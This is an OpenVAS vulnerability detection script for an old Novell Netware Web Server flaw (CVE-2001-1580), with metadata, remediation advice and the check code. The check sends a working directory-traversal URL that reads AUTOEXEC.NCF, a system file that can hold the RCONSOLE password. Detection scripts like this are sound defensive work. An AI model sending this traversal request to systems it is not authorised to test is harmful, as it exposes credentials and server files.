# OpenVAS Vulnerability Test
# $Id: novell_viewcode.nasl 4974 2017-01-10 15:46:50Z mime $
# Description: Netware Web Server Sample Page Source Disclosure
#
# Authors:
# David Kyger <david_kyger@symantec.com>
# Updated By: Antu Sanadi <santu@secpod> on 2010-07-06
# Updated CVE, CVSS Base and Risk factor  
#
# Copyright:
# Copyright (C) 2002 David Kyger
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "On a Netware Web Server, viewcode.jse allows the source code of web pages to 
be viewed. As an argument, a URL is passed to sewse.nlm. The URL can be 
altered and will permit files outside of the web root to be viewed. 
As a result, sensitive information could be obtained from the Netware server, 
such as the RCONSOLE password located in AUTOEXEC.NCF.

Example: http://target//lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf";

tag_solution = "Remove sample NLMs and default files from the web server.
Also, ensure the RCONSOLE password is encrypted and utilize a password 
protected screensaver for console access.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.12048");
  script_version("$Revision: 4974 $");
  script_tag(name:"last_modification", value:"$Date: 2017-01-10 16:46:50 +0100 (Tue, 10 Jan 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(3715);
  script_cve_id("CVE-2001-1580");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Netware Web Server Sample Page Source Disclosure");
  script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_banner");
  script_copyright("This script is Copyright (C) 2002 David Kyger");
  script_family("Netware");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/246358");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

url = "/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf";

port = get_http_port(default:80);

req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req);

if (buf =~ "HTTP/1\.. 200" && "AUTOEXEC.NCF" >< buf)
{
  report = report_vuln_url( port:port, url:url );
  security_message(port:port, data:report);
  exit( 0 );
}

exit( 99 );


